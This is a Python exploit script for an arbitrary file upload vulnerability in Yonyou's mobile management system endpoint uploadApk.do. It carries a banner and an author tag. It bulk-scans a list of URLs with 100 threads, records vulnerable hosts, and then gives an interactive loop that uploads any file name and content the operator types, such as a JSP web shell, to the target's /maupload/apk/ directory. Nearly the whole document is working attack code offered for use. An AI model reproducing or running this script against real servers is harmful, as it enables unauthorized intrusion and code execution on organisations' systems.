# 用友-移动管理系统 uploadApk.do 任意文件上传漏洞
import requests,argparse,sys,time,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
██╗   ██╗███╗   ██╗      ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗   ██████╗  ██████╗ 
╚██╗ ██╔╝████╗  ██║      ██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝   ██╔══██╗██╔═══██╗
 ╚████╔╝ ██╔██╗ ██║█████╗██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║███████║██████╔╝█████╔╝    ██║  ██║██║   ██║
  ╚██╔╝  ██║╚██╗██║╚════╝██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║██╔══██║██╔═══╝ ██╔═██╗    ██║  ██║██║   ██║
   ██║   ██║ ╚████║      ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝██║  ██║██║     ██║  ██╗██╗██████╔╝╚██████╔╝
   ╚═╝   ╚═╝  ╚═══╝       ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚═════╝  ╚═════╝ 
                                                                            Author:daesen804
                                                                            Version:1.0.0                                                   
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="用友-移动管理系统 uploadApk.do 任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    url_payload = '/maportal/appmanager/uploadApk.do?pk_obj='
    headers = {
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Cookie': 'JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server',
        'Connection': 'close',
    }
    data = (
        '------WebKitFormBoundaryvLTG6zlX0gZ8LzO3\r\n'
        'Content-Disposition: form-data; name="downloadpath"; filename="test.jsp"\r\n'
        'Content-Type: application/msword\r\n'
        '\r\n'
        'test\r\n'
        '------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--\r\n'
    )
    try:
        res1 = requests.post(url=target+url_payload,headers=headers,data=data,timeout=10,verify=False)
        res2 = json.loads(res1.text)
        result = target+'/maupload/apk/test.jsp'
        if res1.status_code == 200 and res2['status'] == 2:
            res3 = requests.get(url=result,headers=headers)
            if 'test' in res3.text:
                with open('result.txt','a') as fp:
                    fp.write(target+'\n')
                print(f"[+]{target} 存在文件上传漏洞 {result}")
                return True
        else:
            print(f"[-]{target} 不存在文件上传漏洞")
    except:
        pass


def exp(target):
    print("--------------正在进行漏洞利用------------")
    time.sleep(2)
    while True:
        filename = input("请输入要上传的文件名：")
        code = input("请输入文件内容：")
        if filename == 'q' or code == 'q':
            exit()

        url_payload = '/maportal/appmanager/uploadApk.do?pk_obj='
        headers = {
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Cookie': 'JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server',
            'Connection': 'close',
        }
        data = (
            '------WebKitFormBoundaryvLTG6zlX0gZ8LzO3\r\n'
            'Content-Disposition: form-data; name="downloadpath"; filename="{}"\r\n'
            'Content-Type: application/msword\r\n'
            '\r\n'
            '{}\r\n'
            '------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--\r\n'
        ).format(filename,code)
        try:
            res1 = requests.post(url=target+url_payload,headers=headers,data=data,timeout=10,verify=False)
            res2 = json.loads(res1.text)
            result = target+'/maupload/apk/'+filename
            if res1.status_code == 200 and res2['status'] == 2:
                res3 = requests.get(url=result,headers=headers,timeout=10)
                if code in res3.text:
                    print(f"[+]上传成功，请访问：{result}")
            else:
                print("[-]不存在文件上传漏洞")
        except:
            pass

if __name__ == "__main__":
    main()